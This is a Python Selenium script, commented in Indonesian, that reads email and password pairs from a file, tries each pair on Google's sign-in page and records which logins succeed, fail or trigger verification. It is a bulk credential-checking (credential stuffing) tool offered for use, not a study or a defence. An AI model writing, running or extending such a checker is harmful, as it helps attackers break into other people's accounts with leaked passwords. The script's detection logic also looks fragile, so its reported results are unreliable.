from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
import time

def login_google(email, password):
    # Inisialisasi WebDriver
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service)

    try:
        # Buka halaman login Google
        driver.get("https://accounts.google.com/")

        # Masukkan email
        email_input = driver.find_element(By.ID, "identifierId")
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        time.sleep(2)  # Tunggu sebentar untuk memuat halaman berikutnya

        # Periksa jika email tidak valid
        try:
            error_message = driver.find_element(By.XPATH, "//div[@jsname='B34EJ']")
            if error_message.is_displayed():
                return "Gagal - Email tidak valid"
        except NoSuchElementException:
            pass

        # Masukkan password
        password_input = driver.find_element(By.NAME, "password")
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        time.sleep(2)  # Tunggu sebentar untuk memuat halaman berikutnya

        # Periksa jika password salah
        try:
            error_message = driver.find_element(By.XPATH, "//div[@jsname='B34EJ']")
            if error_message.is_displayed():
                return "Gagal - Password salah"
        except NoSuchElementException:
            pass

        # Periksa jika membutuhkan verifikasi
        try:
            verification_message = driver.find_element(By.XPATH, "//div[@id='view_container']")
            if verification_message.is_displayed():
                return "Gagal - Membutuhkan verifikasi"
        except NoSuchElementException:
            pass

        # Jika berhasil login
        return "Berhasil - Login sukses"

    except TimeoutException:
        return "Gagal - Timeout"
    finally:
        driver.quit()

def process_email_list(file_path):
    results = []

    with open(file_path, 'r') as file:
        lines = file.readlines()
        for line in lines:
            email, password = line.strip().split(',')
            result = login_google(email, password)
            results.append(f"{email}: {result}")

    with open('output.txt', 'w') as output_file:
        for result in results:
            output_file.write(result + '\n')

# Path ke file yang berisi daftar email dan password
file_path = 'email_list.txt'
process_email_list(file_path)
